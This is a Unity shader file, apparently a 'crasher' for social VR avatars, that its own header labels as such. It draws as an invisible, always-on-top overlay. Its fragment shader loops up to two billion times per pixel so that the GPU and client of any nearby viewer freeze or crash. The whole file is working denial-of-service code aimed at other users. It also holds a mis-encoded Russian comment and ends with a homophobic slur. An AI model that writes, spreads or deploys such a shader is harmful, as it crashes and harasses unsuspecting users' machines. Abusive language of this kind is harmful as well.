Shader "XxMAKOCHILLxX/CRASH/invisibleCrash"
//starina XxMAKOCHILLxX's CRASHER
//Bastik help 
{
    Properties
    {
        _MainTex ("Texture", 2D) = "white" {}
		_Alpha ("OwO Transparency", Range (0.0, 999.0)) = 9.9
		_Range ("UwU radius", Int) = 1.0
	
	volsteps("Crash", int) = 1
    }

    SubShader
    {
        Tags { "Queue"="Transparent" "IgnoreProjector"="True" "RenderType" = "TransparentCutout" "Queue" = "Overlay+2147479148" }
        

		LOD 9999
		ZWrite Off
		Cull Off
        ZTest Always 
        Blend SrcAlpha OneMinusSrcAlpha 

        Stencil 
        {
           Ref 753
           Comp NotEqual
        }

        Pass
        {
            CGPROGRAM
            #pragma vertex vert
            #pragma fragment frag
            #include "UnityCG.cginc"

            sampler2D _MainTex;
			fixed4 _MainTex_ST;
			float _Alpha, _Range;

			 struct v2f
            {
                float2 uv : TEXCOORD0;
                float4 pos : SV_POSITION;
            };

            v2f vert(float4 pos : POSITION, float2 uv : TEXCOORD0)
            {
				 v2f o;
				 o.uv = TRANSFORM_TEX(uv, _MainTex);
				 float4 dist = distance(_WorldSpaceCameraPos, mul(unity_ObjectToWorld, float4(0,0,0,1)));

				 #if UNITY_SINGLE_PASS_STEREO
				float offset = length(abs(unity_StereoWorldSpaceCameraPos[0] - unity_StereoWorldSpaceCameraPos[1]));
				float4 abspos = pos + half4((0.5-1*unity_StereoEyeIndex)*offset, 0, 0, 0);
				#else
				float4 abspos = pos;
				#endif
				abspos.z = -abspos.z;
				o.pos = mul(UNITY_MATRIX_P, abspos);
				o.pos = o.pos - o.pos*step(_Range, dist);

				return o;
            }
			//HowYouLikeThat
			//Íå ñóäèòå ñòðîãî ïåðâûé êðàø êîòîðûé ñäåëàë íà ïîäîáèå îäíîãî) óëó÷øèë è ñäåëàë åãî ñèëüíåå

            float4 frag(v2f i) : SV_Target
            {
            float power;
            float power1;

                fixed4 uvnew;
				uvnew = tex2D(_MainTex, i.uv);
        for(int i = 0; i <= 2000000000; i++){
          power = pow(0, 0);
          power1 = pow(0, 0);
        }
				return uvnew*float4(pow(power,power1), pow(power,power1), pow(power,power1), _Alpha);
            }
            ENDCG
        }
    }
}
//BASTIK PIDOR